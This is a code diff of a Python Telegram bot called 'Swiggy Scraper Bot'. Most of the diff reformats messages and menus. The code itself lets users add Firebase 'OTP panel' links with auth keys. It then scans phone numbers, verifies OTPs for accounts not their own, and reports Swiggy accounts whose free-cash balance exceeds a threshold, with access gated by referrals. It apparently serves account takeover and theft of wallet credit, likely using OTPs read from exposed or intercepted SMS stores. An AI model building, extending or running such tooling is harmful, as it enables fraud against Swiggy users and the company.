 
     try:
         verified = await client.verify_otp(phone, otp)
-    except Exception:
-        await session.close()
-        context.user_data.pop("awaiting_check_otp", None)
-        context.user_data.pop("check_phone", None)
-        context.user_data.pop("check_client", None)
-        context.user_data.pop("check_session", None)
-        await update.message.reply_text("Error verifying OTP. Try again.")
+    except Exception as e:
+        await _close_check_session(context)
+        await update.message.reply_text("⚠️ Error verifying OTP. Please try again.")
+        logger.debug("verify_otp error: %s", e)
         return
 
     if not verified:
         await update.message.reply_text(
-            NL.join([
-                "OTP verification failed.",
-                "Wrong OTP or expired. Use Check Number to try again.",
-            ])
+            "❌ OTP verification failed.\nWrong OTP or it expired. Use *Check Number* to try again.",
+            parse_mode="Markdown",
         )
-        context.user_data.pop("awaiting_check_otp", None)
-        context.user_data.pop("check_phone", None)
-        context.user_data.pop("check_client", None)
-        context.user_data.pop("check_session", None)
-        if session and not session.closed:
-            await session.close()
+        await _close_check_session(context)
         return
 
-    await update.message.reply_text("OTP verified! Checking free cash...")
+    await update.message.reply_text("💳 OTP verified! Checking free cash balance...")
 
     campaign_id = context.user_data.get("check_campaign", DEFAULT_CAMPAIGN_ID)
     free_cash = await client.get_free_cash(campaign_id)
 
-    context.user_data.pop("awaiting_check_otp", None)
-    context.user_data.pop("check_phone", None)
-    context.user_data.pop("check_client", None)
-    context.user_data.pop("check_session", None)
-    if session and not session.closed:
-        await session.close()
+    await _close_check_session(context)
 
     if free_cash is None:
         await update.message.reply_text(
-            NL.join([
-                "Number: " + phone,
-                "Could not fetch free cash.",
-                "Account may have restrictions.",
-            ])
+            f"📱 Number: `{phone}`\n⚠️ Could not fetch free cash. Account may have restrictions.",
+            parse_mode="Markdown",
         )
     else:
+        status = "🟢 HIGH" if free_cash >= DEFAULT_THRESHOLD else "🔴 Low"
         await update.message.reply_text(
-            NL.join([
-                "Number: " + phone,
-                "Free Cash: Rs " + str(free_cash),
-                "User ID: " + (client.user_id or "N/A"),
-            ])
+            f"📱 Number: `{phone}`\n"
+            f"💰 Free Cash: *₹{free_cash}* {status}\n"
+            f"👤 User ID: `{client.user_id or 'N/A'}`",
+            parse_mode="Markdown",
         )
 
 
-async def start_command(update, context):
+# ─── Menus & Commands ─────────────────────────────────────────────────────────
+
+MAIN_KEYBOARD = ReplyKeyboardMarkup(
+    [
+        ["🚀 Start Scan", "🛑 Stop Scan"],
+        ["🔢 Check Number"],
+        ["➕ Add Panel", "🗑 Remove Panel"],
+        ["📋 My Panels", "📊 My Status"],
+        ["🔗 My Referral", "⏰ My Access"],
+    ],
+    resize_keyboard=True,
+)
+
+
+async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    is_admin = uid in ADMIN_IDS
+
+    my_panels = get_user_panels(uid)
+    bot_info = await context.bot.get_me()
+    ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"
+
+    u = get_user(uid)
+    refs = u.get("referrals_given", 0) if u else 0
+    expiry = u.get("access_expiry", 0) if u else 0
+
+    if is_admin:
+        access_str = "♾️ Unlimited (Admin)"
+    elif expiry > time.time():
+        exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m/%Y")
+        access_str = f"✅ Active till {exp_str}"
+    else:
+        needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
+        access_str = f"❌ Expired | Refer {needed} more to unlock"
+
+    role = "👑 Admin" if is_admin else "👤 Member"
+
+    await update.effective_message.reply_text(
+        f"🍊 *Swiggy Scraper Bot*\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"🎭 Role: {role}\n"
+        f"🔑 Access: {access_str}\n"
+        f"📋 Your Panels: {len(my_panels)}\n"
+        f"👥 Referrals: {refs}\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"🔒 Your panels are *PRIVATE* — nobody else can see or use them.\n\n"
+        f"🔗 Referral: `{ref_link}`",
+        reply_markup=MAIN_KEYBOARD,
+        parse_mode="Markdown",
+    )
+
+
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     username = update.effective_user.username or ""
     args = context.args or []
 
     upsert_user(uid, username=username)
 
+    # Handle referral parameter
     if args and args[0].startswith("r"):
         try:
             referrer_id = int(args[0][1:])
@@ -1031,21 +1140,20 @@ async def start_command(update, context):
                     upsert_user(uid, referred_by=referrer_id)
                     ref_data = get_user(referrer_id)
                     if ref_data is not None:
-                        old_refs = ref_data.get("referrals_given", 0)
-                        new_refs = old_refs + 1
+                        new_refs = ref_data.get("referrals_given", 0) + 1
                         upsert_user(referrer_id, referrals_given=new_refs)
+                        bot_info = await context.bot.get_me()
                         if new_refs % REFERRALS_FOR_1H == 0:
                             expiry = grant_access_hours(referrer_id, ACCESS_HOURS)
                             exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m")
                             try:
                                 await context.bot.send_message(
                                     referrer_id,
-                                    NL.join([
-                                        "Congratulations!",
-                                        "Your " + str(new_refs) + " referrals are done!",
-                                        "1 hour access granted!",
-                                        "Expires: " + exp_str,
-                                    ])
+                                    f"🎉 *Congratulations!*\n"
+                                    f"You now have *{new_refs} referrals*!\n"
+                                    f"✅ *1 hour access granted!*\n"
+                                    f"⏰ Expires: {exp_str}",
+                                    parse_mode="Markdown",
                                 )
                             except Exception:
                                 pass
@@ -1054,112 +1162,51 @@ async def start_command(update, context):
                             try:
                                 await context.bot.send_message(
                                     referrer_id,
-                                    NL.join([
-                                        "New referral!",
-                                        "Total: " + str(new_refs) + " | " + str(remaining) + " more needed for access",
-                                    ])
+                                    f"👥 *New referral!*\n"
+                                    f"Total: {new_refs} | {remaining} more needed for 1h access",
+                                    parse_mode="Markdown",
                                 )
                             except Exception:
                                 pass
         except (ValueError, IndexError):
             pass
 
+    # Gate: channel membership check
     if uid not in ADMIN_IDS:
         not_joined = await check_channels(context.bot, uid)
         if not_joined:
             kb = channel_join_keyboard(not_joined)
             await update.message.reply_text(
-                NL.join([
-                    "Welcome to Swiggy Scraper Bot!",
-                    "",
-                    "Step 1: Join these channels first, then you can use the bot:",
-                ]),
+                "👋 *Welcome to Swiggy Scraper Bot!*\n\n"
+                "📢 *Step 1:* Join these channels first, then you can use the bot:",
                 reply_markup=kb,
+                parse_mode="Markdown",
             )
             return
 
+    # Gate: access check
     if uid not in ADMIN_IDS and not has_access(uid):
         bot_info = await context.bot.get_me()
-        ref_link = "https://t.me/" + bot_info.username + "?start=r" + str(uid)
+        ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"
         u = get_user(uid)
         refs = u.get("referrals_given", 0) if u else 0
         needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
 
         await update.message.reply_text(
-            NL.join([
-                "Channels joined!",
-                "",
-                "Step 2: Share your referral link to unlock the bot.",
-                "",
-                "Your Referral Link:",
-                ref_link,
-                "",
-                "Current referrals: " + str(refs),
-                str(needed) + " more needed = 1 hour access",
-                "",
-                "Every 3 referrals = 1 hour access!",
-                "Share and unlock the bot!",
-            ])
+            "✅ *Channels joined!*\n\n"
+            "🔗 *Step 2:* Share your referral link to unlock the bot.\n\n"
+            f"Your Referral Link:\n`{ref_link}`\n\n"
+            f"👥 Current referrals: {refs}\n"
+            f"📌 {needed} more needed = 1 hour access\n\n"
+            "💡 Every 3 referrals = 1 hour access!",
+            parse_mode="Markdown",
         )
         return
 
     await show_main_menu(update, context)
 
 
-async def show_main_menu(update, context):
-    uid = update.effective_user.id
-    is_admin = uid in ADMIN_IDS
-
-    my_panels = get_user_panels(uid)
-    panel_count = len(my_panels)
-
-    bot_info = await context.bot.get_me()
-    ref_link = "https://t.me/" + bot_info.username + "?start=r" + str(uid)
-
-    u = get_user(uid)
-    refs = u.get("referrals_given", 0) if u else 0
-    expiry = u.get("access_expiry", 0) if u else 0
-
-    if is_admin:
-        access_str = "Unlimited (Admin)"
-    elif expiry > time.time():
-        exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m/%Y")
-        access_str = "Active till " + exp_str
-    else:
-        needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
-        access_str = "Expired | " + str(needed) + " more refer needed"
-
-    keyboard = ReplyKeyboardMarkup(
-        [
-            ["Start Scan", "Stop Scan"],
-            ["Check Number"],
-            ["Add My Panel", "Remove My Panel"],
-            ["My Panels", "My Status"],
-            ["My Referral", "My Access"],
-        ],
-        resize_keyboard=True,
-    )
-
-    role = "Admin" if is_admin else "Member"
-
-    await update.effective_message.reply_text(
-        NL.join([
-            "Swiggy Scraper Bot",
-            "====================",
-            "Role: " + role,
-            "Access: " + access_str,
-            "Your Panels: " + str(panel_count),
-            "Referrals: " + str(refs),
-            "====================",
-            "Your panels are PRIVATE - nobody else can see or use them.",
-            "",
-            "Referral: " + ref_link,
-        ]),
-        reply_markup=keyboard,
-    )
-
-
-async def check_join_callback(update, context):
+async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     uid = query.from_user.id
@@ -1168,294 +1215,270 @@ async def check_join_callback(update, context):
     if not_joined:
         kb = channel_join_keyboard(not_joined)
         await query.edit_message_text(
-            "Still not joined all channels:",
+            "❌ You haven't joined all channels yet:",
             reply_markup=kb,
         )
-    else:
-        if uid not in ADMIN_IDS and not has_access(uid):
-            bot_info = await context.bot.get_me()
-            ref_link = "https://t.me/" + bot_info.username + "?start=r" + str(uid)
-            u = get_user(uid)
-            refs = u.get("referrals_given", 0) if u else 0
-            needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
-
-            await query.edit_message_text(
-                NL.join([
-                    "Channels joined!",
-                    "",
-                    "Step 2: Share your referral link to unlock the bot.",
-                    "",
-                    "Your Referral Link:",
-                    ref_link,
-                    "",
-                    "Current referrals: " + str(refs),
-                    str(needed) + " more needed = 1 hour access",
-                    "",
-                    "Every 3 referrals = 1 hour access!",
-                ])
-            )
-        else:
-            await query.edit_message_text("All channels joined! Welcome!")
-            await show_main_menu(update, context)
-
-
-async def start_scan(update, context):
-    uid = update.effective_user.id
+        return
 
     if uid not in ADMIN_IDS and not has_access(uid):
-        await update.message.reply_text("Access expired. Share your referral link to unlock!")
+        bot_info = await context.bot.get_me()
+        ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"
+        u = get_user(uid)
+        refs = u.get("referrals_given", 0) if u else 0
+        needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
+        await query.edit_message_text(
+            "✅ *Channels joined!*\n\n"
+            "🔗 *Step 2:* Share your referral link to unlock the bot.\n\n"
+            f"Your Referral Link:\n`{ref_link}`\n\n"
+            f"👥 Referrals: {refs}\n"
+            f"📌 {needed} more needed = 1 hour access",
+            parse_mode="Markdown",
+        )
+        return
+
+    await query.edit_message_text("✅ All channels joined! Welcome!")
+    await show_main_menu(update, context)
+
+
+# ─── Scan Commands ────────────────────────────────────────────────────────────
+
+async def start_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if uid not in ADMIN_IDS and not has_access(uid):
+        await update.message.reply_text("⛔ Access expired. Share your referral link to unlock!")
         return
 
     my_panels = get_user_panels(uid)
     if not my_panels:
         await update.message.reply_text(
-            NL.join([
-                "You have no panels!",
-                "",
-                'Tap "Add My Panel" and add your Firebase panel link.',
-                "Only YOUR panels will be used - nobody else can access them.",
-            ])
+            "❌ *No panels added yet!*\n\n"
+            'Tap *➕ Add Panel* and add your Firebase panel link.\n'
+            "Your panels are private — nobody else can use them.",
+            parse_mode="Markdown",
         )
         return
 
     us = await session_manager.get(uid)
     if us.is_running:
-        await update.message.reply_text("Scan already running! Use Stop Scan first.")
+        await update.message.reply_text("⚠️ A scan is already running! Use *🛑 Stop Scan* first.", parse_mode="Markdown")
         return
 
     if len(my_panels) == 1:
         pk = list(my_panels.keys())[0]
         context.user_data["selected_panel"] = pk
         await update.message.reply_text(
-            NL.join([
-                "Panel auto-selected: " + my_panels[pk].get("name", "Unknown"),
-                "",
-                "Send settings:",
-                "threshold campaign_id sender",
-                "",
-                "Example: 190 " + DEFAULT_CAMPAIGN_ID + " SWIGGY",
-                "",
-                'Or just send "default" for defaults',
-            ])
+            f"📋 *Panel auto-selected:* `{my_panels[pk].get('name', 'Unknown')}`\n\n"
+            "⚙️ Send scan settings as:\n`threshold campaign_id sender`\n\n"
+            f"Example: `190 {DEFAULT_CAMPAIGN_ID} SWIGGY`\n\n"
+            'Or just send `default` to use defaults.',
+            parse_mode="Markdown",
         )
         context.user_data["awaiting_scan_settings"] = True
         return
 
-    buttons = []
-    for pk, pc in my_panels.items():
-        buttons.append(
-            [InlineKeyboardButton(pc.get("name", "Unknown"), callback_data="panel_" + pk)]
-        )
+    buttons = [
+        [InlineKeyboardButton(f"📋 {pc.get('name', 'Unknown')}", callback_data=f"panel_{pk}")]
+        for pk, pc in my_panels.items()
+    ]
     await update.message.reply_text(
-        "Select YOUR panel to scan:",
+        "📋 *Select your panel to scan:*",
         reply_markup=InlineKeyboardMarkup(buttons),
+        parse_mode="Markdown",
     )
 
 
-async def panel_selected_callback(update, context):
+async def panel_selected_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     uid = query.from_user.id
 
-    data = query.data
-    if not data.startswith("panel_"):
-        return
-
-    pk = data[6:]
+    pk = query.data[6:]  # strip "panel_"
     my_panels = get_user_panels(uid)
     if pk not in my_panels:
-        await query.edit_message_text("Panel not found.")
+        await query.edit_message_text("❌ Panel not found.")
         return
 
     context.user_data["selected_panel"] = pk
     await query.edit_message_text(
-        NL.join([
-            "Selected: " + my_panels[pk].get("name", "Unknown"),
-            "",
-            "Send settings:",
-            "threshold campaign_id sender",
-            "",
-            "Example: 190 " + DEFAULT_CAMPAIGN_ID + " SWIGGY",
-            "",
-            'Or just send "default" for defaults',
-        ])
+        f"✅ *Selected:* `{my_panels[pk].get('name', 'Unknown')}`\n\n"
+        "⚙️ Send scan settings as:\n`threshold campaign_id sender`\n\n"
+        f"Example: `190 {DEFAULT_CAMPAIGN_ID} SWIGGY`\n\n"
+        'Or just send `default` to use defaults.',
+        parse_mode="Markdown",
     )
     context.user_data["awaiting_scan_settings"] = True
 
 
-async def stop_scan(update, context):
+async def stop_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     us = await session_manager.get(uid)
 
     if not us.is_running:
-        await update.message.reply_text("No scan running.")
+        await update.message.reply_text("ℹ️ No scan is currently running.")
         return
 
-    for task_id, task in list(us.running_tasks.items()):
+    for task in list(us.running_tasks.values()):
         task.cancel()
     us.running_tasks.clear()
     us.is_running = False
 
     await update.message.reply_text(
-        NL.join([
-            "Scan Stopped!",
-            "Scanned: " + str(us.total_scanned),
-            "Found: " + str(us.total_found),
-        ])
+        f"🛑 *Scan Stopped*\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"📊 Scanned: {us.total_scanned}\n"
+        f"✅ Found: {us.total_found}",
+        parse_mode="Markdown",
     )
 
 
-async def handle_add_my_panel(update, context):
+# ─── Panel Management ─────────────────────────────────────────────────────────
+
+async def handle_add_my_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if uid not in ADMIN_IDS and not has_access(uid):
-        await update.message.reply_text("Access expired. Share your referral link to unlock!")
+        await update.message.reply_text("⛔ Access expired. Share your referral link to unlock!")
         return
 
     await update.message.reply_text(
-        NL.join([
-            "Add YOUR Panel",
-            "",
-            "Send your Firebase panel link:",
-            "- Raw: https://xxx-default-rtdb.firebaseio.com",
-            "- With auth: https://xxx.firebaseio.com?auth=KEY",
-            "- Encoded: https://panel.site/?s=...",
-            "- Merge: https://free-otp-panel.vercel.app/#merge=...",
-            "",
-            "Only YOUR panel - nobody else can use it.",
-            "Multiple links = one per line",
-        ])
+        "➕ *Add YOUR Panel*\n\n"
+        "Send your Firebase panel link (one per line for multiple):\n\n"
+        "Supported formats:\n"
+        "• `https://xxx-default-rtdb.firebaseio.com`\n"
+        "• `https://xxx.firebaseio.com?auth=KEY`\n"
+        "• `https://panel.site/?s=BASE64`\n"
+        "• `https://free-otp-panel.vercel.app/#merge=...`\n\n"
+        "🔒 Only YOU can use your panels — they are completely private.",
+        parse_mode="Markdown",
     )
     context.user_data["awaiting_add_my_panel"] = True
 
 
-async def handle_remove_my_panel(update, context):
+async def handle_remove_my_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     my_panels = get_user_panels(uid)
 
     if not my_panels:
-        await update.message.reply_text("You have no panels.")
+        await update.message.reply_text("ℹ️ You have no panels to remove.")
         return
 
-    lines = ["Remove YOUR Panel", ""]
+    lines = ["🗑 *Remove YOUR Panel*\n"]
     plist = []
     for i, (pk, pc) in enumerate(my_panels.items(), 1):
-        lines.append(str(i) + ". " + pc.get("name"))
+        lines.append(f"{i}. `{pc.get('name', 'Unknown')}`")
         plist.append(pk)
-    lines.append("")
-    lines.append("Send number to remove.")
+    lines.append("\nSend the *number* of the panel to remove.")
 
     context.user_data["awaiting_remove_my_panel"] = True
     context.user_data["my_panels_list"] = plist
-    await update.message.reply_text(NL.join(lines))
+    await update.message.reply_text(NL.join(lines), parse_mode="Markdown")
 
 
-async def my_panels_command(update, context):
+async def my_panels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     my_panels = get_user_panels(uid)
 
     if not my_panels:
         await update.message.reply_text(
-            NL.join([
-                "You have no panels.",
-                "",
-                'Tap "Add My Panel" to add your link.',
-            ])
+            "ℹ️ *No panels added yet.*\n\nTap *➕ Add Panel* to add your Firebase link.",
+            parse_mode="Markdown",
         )
         return
 
-    lines = ["Your Panels", "====================", ""]
+    lines = ["📋 *Your Panels*", "━━━━━━━━━━━━━━━━━━", ""]
     for i, (pk, pc) in enumerate(my_panels.items(), 1):
-        api_url = pc.get("api_url", "")[:45]
-        lines.append(str(i) + ". " + pc.get("name"))
-        lines.append("   API: " + api_url + "...")
+        api_url = pc.get("api_url", "N/A")
+        short_url = api_url[:45] + "..." if len(api_url) > 45 else api_url
+        added = pc.get("added_date", "?")
+        lines.append(f"*{i}. {pc.get('name', 'Unknown')}*")
+        lines.append(f"   🔗 `{short_url}`")
+        lines.append(f"   📅 Added: {added}")
         lines.append("")
-    lines.append("These are PRIVATE - nobody else can see them.")
 
-    await update.message.reply_text(NL.join(lines))
+    lines.append("🔒 These are PRIVATE — nobody else can see them.")
+    await update.message.reply_text(NL.join(lines), parse_mode="Markdown")
 
 
-async def my_status_command(update, context):
+async def my_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     us = await session_manager.get(uid)
     my_panels = get_user_panels(uid)
 
     lines = [
-        "Your Status",
-        "====================",
-        "Your Panels: " + str(len(my_panels)),
-        "Scan Running: " + ("Yes" if us.is_running else "No"),
+        "📊 *Your Status*",
+        "━━━━━━━━━━━━━━━━━━",
+        f"📋 Your Panels: {len(my_panels)}",
+        f"⚙️ Scan Running: {'✅ Yes' if us.is_running else '❌ No'}",
     ]
     if us.is_running:
-        lines.append("Scanned: " + str(us.total_scanned))
-        lines.append("Found: " + str(us.total_found))
-        lines.append("Workers: " + str(DEFAULT_WORKERS))
-    lines.append("====================")
+        lines.append(f"🔍 Scanned: {us.total_scanned}")
+        lines.append(f"✅ Found: {us.total_found}")
+        lines.append(f"⚙️ Workers: {DEFAULT_WORKERS}")
+    lines.append("━━━━━━━━━━━━━━━━━━")
 
-    await update.message.reply_text(NL.join(lines))
+    await update.message.reply_text(NL.join(lines), parse_mode="Markdown")
 
 
-async def my_referral_command(update, context):
+async def my_referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     u = get_user(uid)
     refs = u.get("referrals_given", 0) if u else 0
     bot_info = await context.bot.get_me()
-    ref_link = "https://t.me/" + bot_info.username + "?start=r" + str(uid)
+    ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"
     next_milestone = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
 
     await update.message.reply_text(
-        NL.join([
-            "Your Referral",
-            "====================",
-            "Total: " + str(refs),
-            "Next 1h access in: " + str(next_milestone) + " more referral(s)",
-            "",
-            "Your Link:",
-            ref_link,
-            "",
-            "Every 3 referrals = 1 hour access!",
-            "Share and unlock the bot!",
-        ])
+        f"🔗 *Your Referral*\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"👥 Total Referrals: {refs}\n"
+        f"⏱ Next 1h access in: {next_milestone} more referral(s)\n\n"
+        f"Your Link:\n`{ref_link}`\n\n"
+        f"💡 *Every 3 referrals = 1 hour access!*\nShare and unlock the bot!",
+        parse_mode="Markdown",
     )
 
 
-async def my_access_command(update, context):
+async def my_access_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if uid in ADMIN_IDS:
-        await update.message.reply_text("Admin - Unlimited access!")
+        await update.message.reply_text("♾️ *Admin — Unlimited access!*", parse_mode="Markdown")
         return
+
     u = get_user(uid)
     expiry = u.get("access_expiry", 0) if u else 0
     refs = u.get("referrals_given", 0) if u else 0
+
     if expiry > time.time():
         remaining = int(expiry - time.time())
         hours, rem = divmod(remaining, 3600)
         mins = rem // 60
         exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m/%Y")
         await update.message.reply_text(
-            NL.join([
-                "Access Active",
-                "Expires: " + exp_str,
-                "Remaining: " + str(hours) + "h " + str(mins) + "m",
-                "Referrals: " + str(refs),
-            ])
+            f"✅ *Access Active*\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"⏰ Expires: {exp_str}\n"
+            f"⌛ Remaining: {hours}h {mins}m\n"
+            f"👥 Referrals: {refs}",
+            parse_mode="Markdown",
         )
     else:
         needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
         await update.message.reply_text(
-            NL.join([
-                "No Access",
-                "Referrals: " + str(refs),
-                str(needed) + " more = 1 hour access",
-                "",
-                "Use /start to get your referral link",
-            ])
+            f"❌ *No Active Access*\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"👥 Referrals: {refs}\n"
+            f"📌 {needed} more = 1 hour access\n\n"
+            "Use /start to get your referral link.",
+            parse_mode="Markdown",
         )
 
 
-async def handle_text_message(update, context):
+# ─── Text Message Router ──────────────────────────────────────────────────────
+
+async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
     uid = update.effective_user.id
 
+    # --- State machine: prioritise awaiting states ---
     if context.user_data.get("awaiting_check_otp"):
         await check_single_number_verify(update, context)
         return
@@ -1468,7 +1491,7 @@ async def handle_text_message(update, context):
         context.user_data.pop("awaiting_scan_settings")
         panel_key = context.user_data.get("selected_panel")
         if not panel_key:
-            await update.message.reply_text("Panel not selected. Try again.")
+            await update.message.reply_text("⚠️ Panel not selected. Please try again.")
             return
 
         if text.lower() == "default":
@@ -1489,8 +1512,10 @@ async def handle_text_message(update, context):
                     sender = parts[2]
             except ValueError:
                 await update.message.reply_text(
-                    'Invalid format. Use: threshold campaign_id sender
-Or just send "default"'
+                    "❌ Invalid format.\n"
+                    "Use: `threshold campaign_id sender`\n"
+                    'Or just send `default`.',
+                    parse_mode="Markdown",
                 )
                 return
 
@@ -1498,35 +1523,32 @@ Or just send "default"'
             run_scraper(uid, context.application, panel_key, sender, campaign_id, threshold)
         )
         await update.message.reply_text(
-            NL.join([
-                "Scan Started!",
-                "Threshold: Rs " + str(threshold),
-                "Campaign: " + campaign_id,
-                "Sender: " + sender,
-                "Workers: " + str(DEFAULT_WORKERS),
-                "",
-                "You'll get progress updates. Use Stop Scan to cancel.",
-            ])
+            f"🚀 *Scan Started!*\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"💰 Threshold: ₹{threshold}\n"
+            f"🎯 Campaign: `{campaign_id}`\n"
+            f"📡 Sender: `{sender}`\n"
+            f"⚙️ Workers: {DEFAULT_WORKERS}\n\n"
+            "You'll get live progress updates. Use *🛑 Stop Scan* to cancel.",
+            parse_mode="Markdown",
         )
         return
 
     if context.user_data.get("awaiting_add_my_panel"):
         context.user_data.pop("awaiting_add_my_panel")
         if uid not in ADMIN_IDS and not has_access(uid):
-            await update.message.reply_text("Access expired!")
+            await update.message.reply_text("⛔ Access expired!")
             return
 
         links = [line.strip() for line in text.split(NL) if line.strip()]
         if not links:
-            await update.message.reply_text("No link found.")
+            await update.message.reply_text("❌ No link found. Please send a valid Firebase link.")
             return
 
         added = 0
         failed = []
         my_panels = get_user_panels(uid)
-        existing_urls = {
-            pc.get("api_url", "").rstrip("/").lower() for pc in my_panels.values()
-        }
+        existing_urls = {pc.get("api_url", "").rstrip("/").lower() for pc in my_panels.values()}
 
         for link in links:
             if not link.startswith("http"):
@@ -1549,7 +1571,7 @@ Or just send "default"'
                     add_user_panel(
                         uid,
                         {
-                            "name": "Panel " + str(len(my_panels) + added + 1),
+                            "name": f"Panel {len(my_panels) + added + 1}",
                             "api_url": api_url,
                             "auth_key": auth_key,
                             "panel_url": link,
@@ -1572,7 +1594,7 @@ Or just send "default"'
             add_user_panel(
                 uid,
                 {
-                    "name": "Panel " + str(len(my_panels) + added + 1),
+                    "name": f"Panel {len(my_panels) + added + 1}",
                     "api_url": api_url,
                     "auth_key": auth_key,
                     "panel_url": link,
@@ -1582,13 +1604,13 @@ Or just send "default"'
             existing_urls.add(normalised)
             added += 1
 
-        msg_lines = [str(added) + " panel(s) added to YOUR account!"]
+        msg_lines = [f"✅ *{added} panel(s) added to YOUR account!*"]
         if failed:
-            msg_lines.append("Failed (" + str(len(failed)) + "):")
+            msg_lines.append(f"\n❌ Failed ({len(failed)}):")
             for f_item in failed:
-                msg_lines.append("  - " + f_item)
-        msg_lines.append("Only YOU can use these - nobody else.")
-        await update.message.reply_text(NL.join(msg_lines))
+                msg_lines.append(f"  • `{f_item}`")
+        msg_lines.append("\n🔒 Only YOU can use these — completely private.")
+        await update.message.reply_text(NL.join(msg_lines), parse_mode="Markdown")
         return
 
     if context.user_data.get("awaiting_remove_my_panel"):
@@ -1600,64 +1622,66 @@ Or just send "default"'
                 my_panels = get_user_panels(uid)
                 removed_name = my_panels.get(plist[idx], {}).get("name", "Unknown")
                 remove_user_panel(uid, plist[idx])
-                await update.message.reply_text("Panel '" + removed_name + "' removed from your account!")
+                await update.message.reply_text(
+                    f"🗑 Panel *{removed_name}* removed from your account!", parse_mode="Markdown"
+                )
             else:
-                await update.message.reply_text("Wrong number!")
+                await update.message.reply_text("❌ Invalid number. Please try again.")
         except ValueError:
-            await update.message.reply_text("Invalid input!")
+            await update.message.reply_text("❌ Please send a valid number.")
         return
 
-    if text == "Start Scan":
-        await start_scan(update, context)
-    elif text == "Stop Scan":
-        await stop_scan(update, context)
-    elif text == "Check Number":
-        await check_single_number_start(update, context)
-    elif text == "Add My Panel":
-        await handle_add_my_panel(update, context)
-    elif text == "Remove My Panel":
-        await handle_remove_my_panel(update, context)
-    elif text == "My Panels":
-        await my_panels_command(update, context)
-    elif text == "My Status":
-        await my_status_command(update, context)
-    elif text == "My Referral":
-        await my_referral_command(update, context)
-    elif text == "My Access":
-        await my_access_command(update, context)
+    # --- Menu button routing ---
+    menu_map = {
+        "🚀 Start Scan": start_scan,
+        "🛑 Stop Scan": stop_scan,
+        "🔢 Check Number": check_single_number_start,
+        "➕ Add Panel": handle_add_my_panel,
+        "🗑 Remove Panel": handle_remove_my_panel,
+        "📋 My Panels": my_panels_command,
+        "📊 My Status": my_status_command,
+        "🔗 My Referral": my_referral_command,
+        "⏰ My Access": my_access_command,
+    }
+    handler = menu_map.get(text)
+    if handler:
+        await handler(update, context)
+    else:
+        # Show menu if user sends an unknown command
+        await show_main_menu(update, context)
 
 
-async def main():
-    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        logger.error("BOT_TOKEN not set!")
+# ─── Entry Point ──────────────────────────────────────────────────────────────
+
+def main():
+    if not BOT_TOKEN:
+        logger.error("BOT_TOKEN environment variable is not set. Exiting.")
         sys.exit(1)
 
-    application = Application.builder().token(BOT_TOKEN).build()
+    application = (
+        Application.builder()
+        .token(BOT_TOKEN)
+        .read_timeout(30)
+        .write_timeout(30)
+        .connect_timeout(30)
+        .pool_timeout(30)
+        .build()
+    )
 
     application.add_handler(CommandHandler("start", start_command))
-    application.add_handler(
-        CallbackQueryHandler(check_join_callback, pattern="^check_join$")
-    )
-    application.add_handler(
-        CallbackQueryHandler(panel_selected_callback, pattern="^panel_")
-    )
-    application.add_handler(
-        MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message)
-    )
+    application.add_handler(CommandHandler("menu", show_main_menu))
+    application.add_handler(CallbackQueryHandler(check_join_callback, pattern="^check_join$"))
+    application.add_handler(CallbackQueryHandler(panel_selected_callback, pattern="^panel_"))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
 
-    logger.info("Swiggy TG Bot starting...")
-    async with application:
-        await application.initialize()
-        await application.start()
-        await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)
-        while True:
-            await asyncio.sleep(1)
+    logger.info("🍊 Swiggy TG Bot starting... (PTB run_polling with graceful shutdown)")
+    # run_polling handles SIGINT/SIGTERM automatically — safe for Railway/Docker
+    application.run_polling(
+        allowed_updates=Update.ALL_TYPES,
+        drop_pending_updates=True,
+        stop_signals=(signal.SIGINT, signal.SIGTERM),
+    )
 
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except (KeyboardInterrupt, SystemExit):
-        pass
-    except Exception as e:
-        logger.fatal(f"Fatal error: {e}")
+    main()
